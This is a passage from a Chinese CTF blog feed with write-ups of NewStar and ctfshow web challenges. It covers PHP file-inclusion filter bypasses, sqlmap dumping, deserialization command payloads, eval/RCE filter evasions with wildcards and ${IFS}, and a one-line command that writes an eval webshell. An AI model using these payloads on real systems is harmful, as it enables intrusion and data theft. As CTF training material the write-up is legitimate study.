class="hljs-string">&quot;/api.php&quot;</span>, <span class="hljs-literal">true</span>);        <span class="hljs-comment">//向/api.php post发包</span><br>    xhr.<span class="hljs-title function_ invoke__">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>);  <span class="hljs-comment">//设置header</span><br>    xhr.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-keyword">if</span> (xhr.readyState === <span class="hljs-number">4</span> &amp;&amp; xhr.status === <span class="hljs-number">200</span>) &#123;<br>        <span class="hljs-keyword">var</span> response = JSON.<span class="hljs-title function_ invoke__">parse</span>(xhr.responseText);<br>        <span class="hljs-title function_ invoke__">alert</span>(response.message);<br>      &#125;<br>    &#125;;<br>    <span class="hljs-keyword">var</span> data = &#123;<br>      score: gameScore,          <br>      &#125;;<br>    xhr.<span class="hljs-title function_ invoke__">send</span>(JSON.<span class="hljs-title function_ invoke__">stringify</span>(data));  <span class="hljs-comment">//json格式发送score</span><br>  &#125;<br>  <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;成绩：&quot;</span>+gameScore);<br>  gameScore=<span class="hljs-number">0</span>;  <br>  curPhase =PHASE_READY;  <br>  hero = <span class="hljs-literal">null</span>;<br>  hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hero</span>();      <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/newstarweek2/1.png"><br><img src="/mdimg/newstarweek2/2.png"></p><h2 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>显然是ban了filter协议的base和rot编码<br>然鹅filter不只支持base和rot编码<br><a href="https://blog.csdn.net/gental_z/article/details/122303393">https://blog.csdn.net/gental_z/article/details/122303393</a><br><code>?file=php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php</code></p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p><code>sqlmap -r 1.txt --batch -D ctf -T here_is_flag -C flag --dump</code><br>1.txt 是 抓包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">GET /?id=TMP1589 HTTP/<span class="hljs-number">1.1</span><br>Host: e0f82dae-d70f-<span class="hljs-number">441</span>e-bb37-aec6423da5b0.node4.buuoj.cn:<span class="hljs-number">81</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">101.0</span>.<span class="hljs-number">4951.41</span> Safari/<span class="hljs-number">537.36</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><h2 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h2><p>反序列化 <code>private </code>变量序列化之后产生不可见字符 用<code>%00</code>替换<br><img src="/mdimg/newstarweek2/3.png"><br><code>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:33:&quot;nl /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code><br><img src="/mdimg/newstarweek2/4.png"><br>也可以用</p><ul><li>od  -c：<code>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:36:&quot;od /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code></li><li>uniq ：<code>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:35:&quot;uniq /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code></li><li>head：<code>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:35:&quot;head /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code></li><li>sort：<code>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:35:&quot;sort /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code></li><li>file -f ：<code>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:38:&quot;file -f /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code></li></ul><h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p><code>.htaccess</code><br><img src="/mdimg/newstarweek2/5.png"><br><code>script</code>标签绕过<br><img src="/mdimg/newstarweek2/6.png"><br><img src="/mdimg/newstarweek2/7.png"></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p><code>dirsearch扫</code><br>buu 特性 要设置延时<br><code>dirsearch -u [http://2720598a-9ade-4894-aa95-bed7e562413c.node4.buuoj.cn:81/](http://2720598a-9ade-4894-aa95-bed7e562413c.node4.buuoj.cn:81/) --delay=5  </code><br><img src="/mdimg/newstarweek2/8.png"><br>GitHack<br><code>python2 GitHack.py -u [http://2720598a-9ade-4894-aa95-bed7e562413c.node4.buuoj.cn:81/.git/](http://2720598a-9ade-4894-aa95-bed7e562413c.node4.buuoj.cn:81/.git/) </code><br>bo0g1pop.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>[^\W]+\((?R)?\)</code><br><code>[^\W]</code>匹配所有字符<br><code>(?R)</code>表示递归<br>这个正则匹配类似<code>abc()</code>的字符 而<code>preg_replace</code>把匹配到的类似的字符置空<br><img src="/mdimg/newstarweek2/9.png"><br><img src="/mdimg/newstarweek2/10.png"><br><img src="/mdimg/newstarweek2/11.png"><br>可以看出 大概逻辑就是括号里面不能有字符，如果有则必须是<code>xxx()</code>格式的<br><code>get_defined_vars scandir</code>ban了好多payload<br>思路就是找到一个可以传参数的地方然后再套一个eval来绕过<br><code>get_defined_vars()</code>返回是一个包含 GET、POST等的数组 这里被ban了，搜一下有没有类似函数<br>有两个<code>get_defined_functions()</code>和<code>get_defined_constants()</code> 分别返回已定义方法 、 常量<br><code>get_defined_functions()</code>里面有很多方法包括<code>scandir</code>和<code>get_defined_vars()</code><br>但是数组太大，不知道怎么选中其中一个键<br>后面想到，能传参数的不只有GET POST 还有 header<br>翻php文档发现<code>get_headers</code>可以取得服务器响应 HTTP 请求所发送的所有标头<br>但是这个函数需要一个参数<br>然后找到了<code>headers_list</code><br><img src="/mdimg/newstarweek2/12.png"><br>语法错误…<br>再找找<br><code>apache_response_headers</code> 还是 只有content-type ………<br>然后找到了<code>getallheaders()</code><br><img src="/mdimg/newstarweek2/13.png"><br>可以用ua头<br><img src="/mdimg/newstarweek2/14.png"><br>或者xff和<code>X-Forwarded-Proto</code> </p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-命令执行web29-web77 wp</title>
    <link href="/2023/10/07/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb29-web77/"/>
    <url>/2023/10/07/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb29-web77/</url>
    
    <content type="html"><![CDATA[<h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><p>我要成为bypass高手！</p><h4 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h4><ul><li>** 正则界定符**</li></ul><p>正则表达式使用界定符包围正则字符串作为正则表达式的代码<br>常见界定符”/“,”#”,”~”或者括号对 () [] {}<br>代码解释:与php的<?php ,?>的开始结束标签相同</p><p><code>/foo bar/   </code>      ; “/“界定符<br><code>#^[^0-9]$#  </code>      ; “#”界定符<br><code>+test+</code>            ; “+”界定符<br><code>%[a-zA-Z0-9_-]%</code>   ; “%”界定符<br>正则字符串中出现界定符时，需要使用反斜线”/“转义处理，</p><p><code>/http:\/\// </code>    ;”/“作为界定符，匹配http://时，”/“需要转义<br><code>#http://# </code>      ;”#”作为界定符，匹配http://时，”/“不需要转义<br>可以在结束分隔符后面增加模式修饰符</p><ul><li><strong>2-1 常量字符串</strong></li></ul><p>匹配常量字符串hello<br><code>&quot;/hello/&quot;</code><br>匹配忽略大小写常量字符串 hello<br><code>&quot;/hello/i&quot;</code></p><ul><li><strong>2-2-1简单变量字符: 使用 带有转义的单个特殊字符表示</strong></li></ul><p>\d    ;匹配一个数字字符                    等价于[0-9]<br>\D    ;匹配一个非数字字符                  等价于[^0-9]<br>\s    ;匹配一个任意空白字符                等价于[\n\r\t\v\f]<br>\S    ;匹配一个任意非空白字符              等价于[^\n\r\t\v\f]<br>\w    ;匹配一个字母/数字/下划线/汉字字符    等价于[A-Za-z0-9_]<br>\W    ;匹配一个任意非单词字符              等价于[^A-Za-z0-9_]<br>.     ;匹配一个 除换行\n外的任意字符        等价于[^\n]<br>\n    ;匹配一个换行符  等价于\x0a和\cL<br>\r    ;匹配一个回车符  等价于\x0d和\cM<br>\t    ;匹配一个水平制表符 等价于\x09和\cI<br>\v    ;匹配一个垂直制表符 等价于\x0b和\cK<br>\f    ;匹配一个换页符  等价于\x0c和\cL<br>另外，如果要查找字符 *、.、/等，则需要在前面用 \ 符号，表示这不是元字符，而只是普通字符而已。<br>*    匹配 * 字符。<br>.    匹配 . 字符。<br>/    匹配 / 字符。<br>\    匹配 \ 字符。<br>[    匹配 [ 字符。</p><ul><li>元字符 </li></ul><p>$    匹配行尾<br>^    匹配行首<br>&lt;    匹配单词词首<br>&gt;    匹配单词词尾</p><p>“/\d/“    匹配数字字符<br>“/\s/“     空白字符<br>“/\w/“    单词字符</p><ul><li><strong>2-2-2字符类变量字符: 使用 []格式表示</strong></li></ul><p>[xyz]  ;匹配xyz其中一个字符<br>[a-z]  ;匹配a到z其中一个字符<br>[A-Z]  ;匹配A到Z其中一个字符<br>[0-9]  ;匹配0到9其中一个字符<br>[^xyz] ;匹配除xyz以外的一个字符<br>[^a-z] ;匹配除a到z外的一个字符<br>[:punct:] ;匹配任意标点符号(#&amp;+   web中这3个好像不行)</p><ul><li><strong>3 正则表达式逻辑控制</strong></li></ul><p>1 匹配位置内容判断<br>^x(exp)     ;判断字符串第一个字符是否为x    if (str.first_letter == x) {匹配}<br>(exp)x$     ;判断字符串最后一个字符是否为x  if (str.last_letter == x) {匹配}<br>\bx(exp)    ;判断单词第一个字符是否是x      if (word.first_letter == x){匹配}<br>(exp)y\b    ;判断单词最后一个字符是否是x    if (word.last_letter == x){匹配}<br>(?&lt;=exp)x     ;匹配前面是exp的x         (if x.prev == exp){匹配x}<br>(?&lt;!exp)x     ;匹配前面不是exp的x       (if x.prev != exp){匹配x}<br>x(?=exp)      ;匹配后面是exp的x         (if x.next == exp){匹配x}<br>x(?!exp)      ;匹配后面不是exp的x       (if x.next != exp){匹配x}</p><ul><li>多个判断组合</li></ul><p>或判断 (?&lt;=bullock|donkey)x  匹配前面是bullock或者donkey的x<br>且判断 (?&lt;=\d{3})(?&lt;!999)foo 匹配前面是3个数字而且不是999的foo<br>嵌套判断 (?&lt;=(?&lt;!foo)bar)baz   嵌套判断匹配前面有 ”bar” 但是 ”bar” 前面没有 ”foo” 的 ”baz”。<br>嵌套判断 (?&lt;=\d{3}…(?&lt;!999))foo 匹配前面有三个数字字符紧跟 3 个不是 999 的任意字符的 ”foo”。</p><ul><li>2 匹配内容次数控制</li></ul><p>贪婪匹配:尽可能多匹配<br>x*      ;匹配零或多次个x字符       for(i=0;i&gt;=0;i++){匹配x<em>i}<br>x+      ;匹配一次或多次个x字符     for(i=0;i&gt;0;i++){匹配x</em>i}<br>x?      ;匹配零次或一次个x字符     for(i=0;0&lt;=i&lt;=1;i++){匹配x<em>i}<br>x{n}    ;匹配n次个x字符            for(i=0;i==n;i++){匹配x*i}<br>x{n,}   ;匹配n次或更多次个x字符    for(i=0;i&gt;=n;i++){匹配x</em>i}<br>x{n,m}  ;匹配n到m次个x字符         for(i=0;n&lt;=x&lt;=m;i++){匹配x*i}</p><ul><li>懒惰匹配：尽可能少匹配</li></ul><p>x*?      ;匹配零或多次个x字符       for(i=0;i&gt;=0;i++){匹配x<em>i}<br>x+?      ;匹配一次或多次个x字符     for(i=0;i&gt;0;i++){匹配x</em>i}<br>x??      ;匹配零次或一次个x字符     for(i=0;0&lt;=i&lt;=1;i++){匹配x<em>i}<br>x{n}?    ;匹配n次个x字符            for(i=0;i==n;i++){匹配x*i}<br>x{n,}?   ;匹配n次或更多次个x字符    for(i=0;i&gt;=n;i++){匹配x</em>i}<br>x{n,m}?  ;匹配n到m次个x字符         for(i=0;n&lt;=x&lt;=m;i++){匹配x*i}</p><ul><li>3-1:普通分组</li></ul><p>(exp)       ;匹配exp变量，并存储到结果分组中<br>(\d)         ;匹配数字分组，并进行存储<br>((2[0-4]\d|25[0-5]|[01]?\d\d?).){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)<br>;匹配多个分组，并进行存储</p><ul><li>3-2: 命名分组</li></ul><p>(?<name>exp)    ;匹配exp变量，并存储到名称为name的结果分组中</p><ul><li>3-3: 一次性分组</li></ul><p>(?&gt;exp)         ;尽可能长匹配exp变量，不对其内部进行匹配</p><ul><li>3-4:条件分组</li></ul><p>(?(conditon)yes-pattern|no-pattern)<br>condition为数字，该数字代表的(之前的)子组得到匹配，使用yes_pattern,否则使用no-pattern<br>condition为断言，断言成功使用yes-pattern,断言失败使用no-pattern</p><ul><li>4 正则模式修正</li></ul><p>\i   ;忽略大小写<br>\m   ;多行模式<br>\s   ;单行模式</p><h4 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>()<br><span class="hljs-title function_ invoke__">passthru</span>()<br><span class="hljs-title function_ invoke__">exec</span>()                             <span class="hljs-comment">//无回显</span><br><span class="hljs-title function_ invoke__">shell_exec</span>()                 <span class="hljs-comment">//无回显</span><br><span class="hljs-title function_ invoke__">popen</span>()                      <span class="hljs-comment">//ssti常见</span><br><span class="hljs-title function_ invoke__">proc_open</span>()<br><span class="hljs-title function_ invoke__">pcntl_exec</span>()            <span class="hljs-comment">// 使用条件：PHP安装并启用了pcntl插件</span><br></code></pre></td></tr></table></figure><h4 id="看目录"><a href="#看目录" class="headerlink" title="看目录"></a>看目录</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">var_dump(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<br>print_r(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<br>print_r(glob(<span class="hljs-string">&quot;*&quot;</span>));                       <span class="hljs-regexp">//</span> 读取当前目录<br>print_r(scandir(pos(localeconv())));     <span class="hljs-regexp">//</span>读取当前目录  <span class="hljs-regexp">//</span>print_r(scandir(<span class="hljs-string">&#x27;.&#x27;</span>));<br>getcwd() == pwd                              <span class="hljs-regexp">//</span> 读取当前目录<br>echo(implode(<span class="hljs-string">&#x27;  &#x27;</span>,scandir(<span class="hljs-string">&#x27;/&#x27;</span>)));        <span class="hljs-regexp">//im</span>plode把数组元素组合为字符串<br>print(implode(<span class="hljs-string">&#x27;  &#x27;</span>,scandir(<span class="hljs-string">&#x27;/&#x27;</span>)));      <span class="hljs-regexp">//im</span>plode把数组元素组合为字符串<br>var_export(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));             <span class="hljs-regexp">//</span>var_export 类似 var_dump<br><br><br></code></pre></td></tr></table></figure><h4 id="读取flag"><a href="#读取flag" class="headerlink" title="读取flag"></a>读取flag</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">more:</span>一页一页的显示档案内容<br><span class="hljs-symbol">less:</span>与 more 类似<br><span class="hljs-symbol">head:</span>查看头几行<br><span class="hljs-symbol">tac:</span>从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br><span class="hljs-symbol">tail:</span>查看尾几行<br>nl：显示的时候，顺便输出行号<br><span class="hljs-symbol">od:</span>以二进制的方式读取档案内容<br><span class="hljs-symbol">vi:</span>一种编辑器，这个也可以查看<br><span class="hljs-symbol">vim:</span>一种编辑器，这个也可以查看<br><span class="hljs-symbol">sort:</span>可以查看<br><span class="hljs-symbol">uniq:</span>可以查看<br>file -f:报错出具体内容<br>sh /flag <span class="hljs-number">2</span>&gt;%<span class="hljs-number">261</span> <span class="hljs-comment">//报错出文件内容    </span><br></code></pre></td></tr></table></figure><h5 id="od："><a href="#od：" class="headerlink" title="od："></a>od：</h5><ul><li>od 命令用于将指定文件内容以八进制、十进制、十六进制、浮点格式或 ASCII 编码字符方式显示，通常用于显示或查看文件中不能直接显示在终端的字符。</li><li>od 命令系统默认的显示方式是八进制</li></ul><p><img src="/mdimg/ctfshow77/1.png"><br>常用 -tc  -a </p><h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">readgzfile(<span class="hljs-string">&quot;/flag.txt&quot;</span>);        <span class="hljs-regexp">//</span>(PHP <span class="hljs-number">4</span>, PHP <span class="hljs-number">5</span>, PHP <span class="hljs-number">7</span>, PHP <span class="hljs-number">8</span>)<br>require(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>readfile(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>include(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br>include<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]?&gt;&amp;<span class="hljs-number">1</span>=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br>show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(pos(localeconv())))));  <br>echo highlight_file(<span class="hljs-keyword">next</span>(array_reverse(scandir(pos(localeconv()))))); <br>?c=<span class="hljs-regexp">/bin/</span>?at<span class="hljs-variable">$&#123;IFS&#125;</span>f???????           <span class="hljs-regexp">//</span>通配符匹配 <span class="hljs-regexp">/bin/</span>cat <br>?c=uniq<span class="hljs-variable">$&#123;IFS&#125;</span>f???.php               <span class="hljs-regexp">//u</span>niq 可检查文本文件中重复出现的行列，删除重复行并输出<br>?c= mv<span class="hljs-variable">$&#123;IFS&#125;</span>fla?.php<span class="hljs-variable">$&#123;IFS&#125;</span>a.txt      <span class="hljs-regexp">//</span> ?c=uniq<span class="hljs-variable">$&#123;IFS&#125;</span>a.txt<br>show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(getcwd()))));  <span class="hljs-regexp">//g</span>etcwd()==pwd<br>eval(<span class="hljs-keyword">next</span>(reset(get_defined_vars())));&amp;cmd=;system(<span class="hljs-string">&quot;tac flag.php&quot;</span>);<br>eval(array_pop(<span class="hljs-keyword">next</span>(get_defined_vars()))); <br>?c=<span class="hljs-regexp">/???/</span>????<span class="hljs-number">64</span> ????.???                     <span class="hljs-regexp">//</span>匹配 ?c=<span class="hljs-regexp">/bin/</span>base64 flag.php <br>getallheaders()  <span class="hljs-regexp">//</span>返回http header数组  然后在相应字段注入马 apache_response_headers() 类似<br></code></pre></td></tr></table></figure><h3 id="写在题前"><a href="#写在题前" class="headerlink" title="写在题前"></a>写在题前</h3><ul><li>web55-web56有临时文件包含，条件竞争</li><li>web 57 <code>$(())</code>构造数字</li><li>web72 <code>glob</code>协议绕<code>open_basedir</code>  <code>uaf读文件</code></li><li>web75 <code>PDO</code> 连数据库</li><li>web77 php 7.4 <code>FFI</code><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"> &lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-09-04 00:26:48</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br>*/<br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(isset($_GET[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    $c = $_GET[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, $c))&#123;<br>        <span class="hljs-built_in">eval</span>($c);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(__FILE__);<br>&#125; <br></code></pre></td></tr></table></figure>过滤了flag，大小写不敏感，不能大小写绕过<br>payload：<br><code>?c=system(&#39;tac f*&#39;);</code> 通配符，cat、nl，vi，more，less，od：<code>?c=passthru(&#39;od -a f*&#39;);</code>，<br><code>?c=system(&quot;nl f&#39;&#39;lag.php&quot;);</code>单引号绕过，cat、tac，vi，都行<br><code>?c=echo </code>nl fl’’ag.php<code>;</code> 单引号绕过，反引号命令执行，cat、tac都行<br>套马：<br><code>?c=eval($_GET[1]);&amp;1=system(&quot;cat flag.php&quot;);</code><br>include+伪协议：<br><code>?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code><br>写马：<br><code>file_put_contents(&quot;a.php&quot;,%20%27&lt;?php%20eval($_POST[&quot;a&quot;]);%20?&gt;%27);</code> 直接访问post或者连webshell<br>主要是绕过flag，其实还有很多读到flag.php的方法，不过前提都是绕过flag<br>改flag.php文件名：<br>用cp，mv，rename<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"> &lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-09-04 00:42:26</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br>*/<br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(isset($_GET[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    $c = $_GET[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, $c))&#123;<br>        <span class="hljs-built_in">eval</span>($c);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(__FILE__);<br>&#125; <br></code></pre></td></tr></table></figure>ban了system和php，不能套php一句话，但可以套eval用其他参数传值绕过正则<br><code>?c=eval($_GET[1]);&amp;1=system(&quot;tac f*&quot;);</code><br>passthru绕过system：<br><code>passthru</code>：<code>?c=passthru(&#39;cat f*&#39;);</code><br>反引号代替system：<br><code>?c=echo </code>cat f*<code>;</code></li></ul><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(isset($_GET[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    $c = $_GET[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, $c))&#123;<br>        <span class="hljs-built_in">eval</span>($c);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    